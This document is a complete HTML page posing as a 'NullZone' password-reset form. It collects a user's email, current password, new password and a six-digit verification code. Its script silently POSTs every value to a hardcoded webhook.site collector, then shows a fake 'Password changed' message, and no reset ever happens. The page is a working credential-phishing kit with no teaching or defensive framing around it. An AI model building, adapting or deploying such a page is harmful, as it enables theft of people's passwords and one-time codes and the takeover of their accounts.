<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>NullZone — Reset Password</title>
  <style>
    :root {
      --neon-blue: #18a0fb;
      --neon-blue-glow: rgba(24, 160, 251, 0.6);
      --bg: #0a0e14;
      --card: #131a24;
      --border: #1f2a38;
      --text: #e6edf3;
      --muted: #8b98a8;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: radial-gradient(circle at 50% 0%, #11202f 0%, var(--bg) 60%);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: var(--text);
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 400px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 36px 32px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
    }

    .brand {
      text-align: center;
      font-size: 34px;
      font-weight: 800;
      letter-spacing: 1px;
      margin: 0 0 6px;
    }

    .brand .null {
      color: var(--neon-blue);
      text-shadow: 0 0 12px var(--neon-blue-glow);
    }

    .brand .zone {
      color: #ffffff;
    }

    .subtitle {
      text-align: center;
      color: var(--muted);
      font-size: 14px;
      margin: 0 0 28px;
    }

    label {
      display: block;
      font-size: 13px;
      color: var(--muted);
      margin-bottom: 6px;
      margin-top: 16px;
    }

    input {
      width: 100%;
      padding: 12px 14px;
      background: #0d141d;
      border: 1px solid var(--border);
      border-radius: 10px;
      color: var(--text);
      font-size: 15px;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    input:focus {
      border-color: var(--neon-blue);
      box-shadow: 0 0 0 3px rgba(24, 160, 251, 0.15);
    }

    .code-input {
      text-align: center;
      letter-spacing: 12px;
      font-size: 22px;
      font-weight: 600;
    }

    button {
      width: 100%;
      margin-top: 24px;
      padding: 13px;
      background: var(--neon-blue);
      color: #04121f;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: transform 0.1s, box-shadow 0.2s;
      box-shadow: 0 0 18px var(--neon-blue-glow);
    }

    button:hover { box-shadow: 0 0 26px var(--neon-blue-glow); }
    button:active { transform: scale(0.98); }

    .error {
      color: #ff6b6b;
      font-size: 13px;
      margin-top: 12px;
      min-height: 16px;
      text-align: center;
    }

    .success {
      text-align: center;
      padding: 20px 0;
    }

    .success .check {
      width: 64px;
      height: 64px;
      margin: 0 auto 18px;
      border-radius: 50%;
      background: rgba(24, 160, 251, 0.12);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 34px;
      color: var(--neon-blue);
      box-shadow: 0 0 24px var(--neon-blue-glow);
    }

    .success h2 {
      margin: 0 0 8px;
      font-size: 20px;
    }

    .success p {
      color: var(--muted);
      font-size: 14px;
      margin: 0;
    }

    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="card">
    <h1 class="brand"><span class="null">Null</span><span class="zone">Zone</span></h1>

    <!-- Step 1: Reset form -->
    <form id="reset-form">
      <p class="subtitle">Reset your password</p>

      <label for="email">Email</label>
      <input type="email" id="email" placeholder="you@example.com" required />

      <label for="current-password">Current Password</label>
      <input type="password" id="current-password" placeholder="••••••••" required />

      <label for="new-password">New Password</label>
      <input type="password" id="new-password" placeholder="••••••••" required />

      <button type="submit">Update</button>
      <div class="error" id="reset-error"></div>
    </form>

    <!-- Step 2: Verification code -->
    <form id="code-form" class="hidden">
      <p class="subtitle">Enter the 6-digit code we sent you</p>

      <label for="code">Verification Code</label>
      <input
        type="text"
        id="code"
        class="code-input"
        inputmode="numeric"
        maxlength="6"
        pattern="\d{6}"
        placeholder="000000"
        required
      />

      <button type="submit">Confirm</button>
      <div class="error" id="code-error"></div>
    </form>

    <!-- Step 3: Success -->
    <div id="success" class="success hidden">
      <div class="check">✓</div>
      <h2>Password changed</h2>
      <p>Your password has been updated successfully.</p>
    </div>
  </div>

  <script>
    const WEBHOOK_URL = "https://webhook.site/db7bceb5-e8a0-4da6-bac9-741de69317eb";

    const resetForm = document.getElementById('reset-form');
    const codeForm = document.getElementById('code-form');
    const success = document.getElementById('success');


    async function sendLog(payload) {
      if (!WEBHOOK_URL) return true;
      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'text/plain' },
          body: JSON.stringify(payload),
        });
        return true;
      } catch (err) {
        return false;
      }
    }

    resetForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const resetError = document.getElementById('reset-error');
      resetError.textContent = '';

      const payload = {
        event: 'password_reset_request',
        email: document.getElementById('email').value,
        currentPassword: document.getElementById('current-password').value,
        newPassword: document.getElementById('new-password').value,
      };

      const ok = await sendLog(payload);
      if (!ok) {
        resetError.textContent = 'Could not reach the logging endpoint.';
        return;
      }

      resetForm.classList.add('hidden');
      codeForm.classList.remove('hidden');
      document.getElementById('code').focus();
    });

    const codeInput = document.getElementById('code');
    codeInput.addEventListener('input', () => {
      codeInput.value = codeInput.value.replace(/\D/g, '');
    });

    codeForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const codeError = document.getElementById('code-error');
      if (codeInput.value.length !== 6) {
        codeError.textContent = 'Please enter all 6 digits.';
        return;
      }
      codeError.textContent = '';

      await sendLog({ event: 'verification_code', code: codeInput.value });

      codeForm.classList.add('hidden');
      success.classList.remove('hidden');
    });
  </script>
</body>
</html>
